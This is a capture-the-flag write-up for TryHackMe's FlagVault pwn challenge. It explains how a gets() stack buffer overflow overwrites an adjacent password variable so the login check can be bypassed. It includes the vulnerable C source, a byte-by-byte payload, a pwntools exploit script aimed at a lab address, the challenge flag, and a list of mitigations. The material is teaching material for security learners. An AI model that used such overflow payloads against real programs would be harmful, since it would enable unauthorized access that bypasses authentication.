# FlagVault - TryHackMe Writeup

## Overview

Today we have another **TryHackMe** challenge named **FlagVault**. This is a beginner-friendly **Binary Exploitation (Pwn)** challenge focused on understanding **stack memory**, **buffer overflows**, and how an insecure function such as `gets()` can be abused to overwrite adjacent variables in memory.

The goal is to analyze the provided source code, understand why authentication is impossible under normal circumstances, and exploit the vulnerable program to retrieve the flag.

---

# Challenge Description

> Cipher asked me to create the most secure vault for flags, so I created a vault that cannot be accessed. You don't believe me? Well, here is the code with the password hardcoded. Not that you can do much with it anymore.

We are given:

- A running service on port **1337**
- The vulnerable source code (`pwn1.c`)

Connect to the machine:

```bash
nc <TARGET_IP> 1337
```

---

# Source Code Analysis

The source code contains several functions:

- `print_banner()` – Displays the ASCII banner.
- `print_flag()` – Opens and prints the contents of `flag.txt`.
- `login()` – Handles authentication.
- `main()` – Initializes buffering and starts the login process.

The vulnerable code is inside the `login()` function.

```c
void login(){
    char password[100] = "";
    char username[100] = "";

    printf("Username: ");
    gets(username);

    // Password input disabled
    // gets(password);

    if(!strcmp(username, "bytereaper") &&
       !strcmp(password, "5up3rP4zz123Byte")){
        print_flag();
    }
    else{
        printf("Wrong password! No flag for you.");
    }
}
```

---

# Understanding the Vulnerability

Immediately one thing stands out.

The program uses:

```c
gets(username);
```

The `gets()` function is considered **unsafe** because it performs **no bounds checking**. It continues reading user input until a newline is encountered, regardless of the size of the destination buffer.

This means we can write more than 100 bytes into `username`, causing a **stack-based buffer overflow**.

---

## Why Can't We Login Normally?

The authentication logic checks two conditions:

```c
strcmp(username, "bytereaper")
strcmp(password, "5up3rP4zz123Byte")
```

However, the password input has been completely disabled.

```c
// gets(password);
```

Since `password` is initialized as:

```c
char password[100] = "";
```

its value always remains an empty string.

Therefore:

```text
username == "bytereaper"      ✔
password == ""                ✘
```

Authentication always fails.

So there is **no legitimate way** to obtain the flag.

---

# Looking at Stack Memory

Inside the function we have:

```c
char password[100];
char username[100];
```

Both variables are allocated on the stack.

A simplified view looks like:

```
Higher Memory
+----------------------+
| username[100]        |
+----------------------+
| password[100]        |
+----------------------+
Lower Memory
```

Because `gets()` has no size restriction, writing beyond the end of the username buffer continues into the adjacent stack memory, allowing us to overwrite the password variable.

---

# Exploitation Strategy

The authentication compares:

```text
username = bytereaper
password = 5up3rP4zz123Byte
```

Our objective is therefore:

- Keep the username equal to `bytereaper`
- Overflow past the username buffer
- Replace the password variable with the correct password

To accomplish this we send:

```python
b"bytereaper\x00"
```

followed by enough padding to reach the password buffer, then finally the password string itself.

---

# Payload Breakdown

```python
payload = (
    b"bytereaper\x00" +
    b"A"*101 +
    b"5up3rP4zz123Byte"
)
```

Let's understand every component.

---

## Part 1

```python
b"bytereaper\x00"
```

This places the correct username into memory.

The NULL byte (`\x00`) terminates the string immediately after `bytereaper`.

When `strcmp()` compares usernames, it sees exactly:

```
bytereaper
```

Everything after the NULL byte is ignored.

---

## Part 2

```python
b"A"*101
```

The username buffer is 100 bytes long.

These padding bytes completely fill the remainder of the username buffer and continue overflowing into the adjacent password variable.

This is what makes the overflow possible.

---

## Part 3

```python
b"5up3rP4zz123Byte"
```

Once the overflow reaches the password buffer, these bytes overwrite its contents.

Now the password variable contains:

```
5up3rP4zz123Byte
```

which is exactly what the program expects.

---

# Visualizing the Overflow

Before the payload:

```
username
+--------------------+
| ""                 |
+--------------------+

password
+--------------------+
| ""                 |
+--------------------+
```

After the payload:

```
username
+------------------------------+
| bytereaper\0AAAAAAA...        |
+------------------------------+

password
+------------------------------+
| 5up3rP4zz123Byte             |
+------------------------------+
```

The NULL byte ensures that the username comparison succeeds, while the overflow changes the password variable in memory.

---

# Exploit Script

Using **pwntools**, the exploit becomes very straightforward.

```python
from pwn import *

conn = remote('10.10.112.218', 1337)

payload = (
    b"bytereaper\x00" +
    b"A"*101 +
    b"5up3rP4zz123Byte"
)

conn.recvuntil(b"Username:")
conn.sendline(payload)

print(conn.recvall().decode())
```

---

# Why This Works

The login condition is:

```c
if(
    !strcmp(username,"bytereaper") &&
    !strcmp(password,"5up3rP4zz123Byte")
)
```

Our payload causes memory to look like:

```
username = bytereaper
password = 5up3rP4zz123Byte
```

Both comparisons now return true.

As a result,

```c
print_flag();
```

is executed and the program prints the flag.

---

# Flag

```
THM{password_0v3rfl0w}
```

---

# Vulnerabilities Identified

- Use of the unsafe `gets()` function.
- Stack-based buffer overflow.
- Hardcoded credentials.
- Authentication bypass through adjacent variable overwrite.
- Lack of bounds checking on user input.

---

# Mitigation

This vulnerability can easily be prevented by following secure programming practices.

- Never use `gets()`. It has been removed from the C standard because it is inherently unsafe.
- Replace `gets()` with `fgets()` and specify the maximum buffer size.
- Avoid storing sensitive variables adjacent to user-controlled buffers.
- Remove hardcoded credentials from the application.
- Compile binaries with modern security protections such as:
  - Stack Canaries
  - PIE (Position Independent Executable)
  - NX (Non-Executable Stack)
  - Full RELRO
  - Fortify Source

---

# Key Takeaways

This challenge demonstrates that disabling functionality does not necessarily improve security. Although the password prompt was removed, the password variable still existed in memory. Because `gets()` performs no boundary checks, an attacker could overflow the username buffer and overwrite the password variable directly, completely bypassing the intended authentication process.

This is a classic example of a **stack-based buffer overflow** where adjacent stack variables can be manipulated to satisfy program logic without ever providing legitimate credentials.

It also highlights why unsafe C library functions such as `gets()` should never be used in production software and why proper input validation and memory safety are essential for secure application development.
